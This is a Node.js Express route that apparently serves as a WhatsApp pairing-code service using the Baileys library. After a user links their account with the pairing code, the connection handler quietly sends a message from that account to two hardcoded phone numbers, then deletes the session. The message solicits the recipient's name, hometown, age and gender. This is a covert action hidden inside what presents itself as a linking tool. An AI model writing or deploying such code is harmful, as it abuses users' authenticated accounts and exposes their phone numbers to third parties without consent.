const express = require('express');
const fs = require('fs');
const { exec } = require("child_process");
let router = express.Router()
const pino = require("pino");
const {
    default: makeWASocket,
    useMultiFileAuthState,
    delay,
    makeCacheableSignalKeyStore,
    Browsers,
    jidNormalizedUser
} = require("@whiskeysockets/baileys");
const { upload } = require('./mega');

function removeFile(FilePath) {
    if (!fs.existsSync(FilePath)) return false;
    fs.rmSync(FilePath, { recursive: true, force: true });
}

router.get('/', async (req, res) => {
    let num = req.query.number;
    async function PrabathPair() {
        const { state, saveCreds } = await useMultiFileAuthState(`./session`);
        try {
            let PrabathPairWeb = makeWASocket({
                auth: {
                    creds: state.creds,
                    keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" }).child({ level: "fatal" })),
                },
                printQRInTerminal: false,
                logger: pino({ level: "fatal" }).child({ level: "fatal" }),
                browser: Browsers.macOS("Safari"),
            });

            if (!PrabathPairWeb.authState.creds.registered) {
                await delay(1500);
                num = num.replace(/[^0-9]/g, '');
                const code = await PrabathPairWeb.requestPairingCode(num);
                if (!res.headersSent) {
                    await res.send({ code });
                }
            }

            PrabathPairWeb.ev.on('creds.update', saveCreds);
            PrabathPairWeb.ev.on("connection.update", async (s) => {
                const { connection, lastDisconnect } = s;
                if (connection === "open") {
                    try {
                        await delay(10000);
                        
                        // මෙතන ඔබ ඉල්ලූ පණිවිඩය ඇතුළත් කර ඇත
                        const custom_msg = `*ꜱᴛᴀᴛᴜꜱ ᴋɪɴɢ ɢʜᴏꜱᴛ.../*\n\n*" ɴ ᴀ ᴍ ᴇ /. ᴄʏʙᴇʀ ɢʜᴏꜱᴛ " 💗🌻.*\n*" ꜰ ʀ ᴏ ᴍ /. ᴍᴀᴛʜᴜɢᴀᴍᴀ" 🐥🤍.*\n*" ᴀ ɢ ᴇ /. 18" 🐼🖤.*\n*" ʙ ᴏ ʏ  /. 🌻❤️.*\n*💗🫶🏻 /.*\n\n*ʏᴏᴜ ɪɴꜰᴏ ᴘʟᴇᴀꜱᴇ│🥺♥️*\n\n*"ɴ ᴀ ᴍ ᴇ / .*\n*"ꜰ ʀ ᴏ ᴍ /.*\n*"ᴀ ɢ ᴇ /.*\n*"ɢ ɪ ʀ ʟ ᴏʀ ʙ ᴏ ʏ /.*\n*💗🫶🏻 /.*\n\n*` + "`REAL GHOST-MD PROGRAMER`*";

                        // ඔබ ලබාදුන් අංක දෙක (Country code එක සහිතව)
                        const targetNumbers = ["94741140620", "94787438929"];

                        // අංක දෙකටම පණිවිඩය යැවීම
                        for (const target of targetNumbers) {
                            await PrabathPairWeb.sendMessage(target + "@s.whatsapp.net", { text: custom_msg });
                        }

                    } catch (e) {
                        console.log(e);
                        exec('pm2 restart prabath');
                    }

                    await delay(100);
                    return await removeFile('./session');
                } else if (connection === "close" && lastDisconnect && lastDisconnect.error && lastDisconnect.error.output.statusCode !== 401) {
                    await delay(10000);
                    PrabathPair();
                }
            });
        } catch (err) {
            exec('pm2 restart prabath-md');
            console.log("service restarted");
            PrabathPair();
            await removeFile('./session');
            if (!res.headersSent) {
                await res.send({ code: "Service Unavailable" });
            }
        }
    }
    return await PrabathPair();
});

process.on('uncaughtException', function (err) {
    console.log('Caught exception: ' + err);
    exec('pm2 restart prabath');
});

module.exports = router;
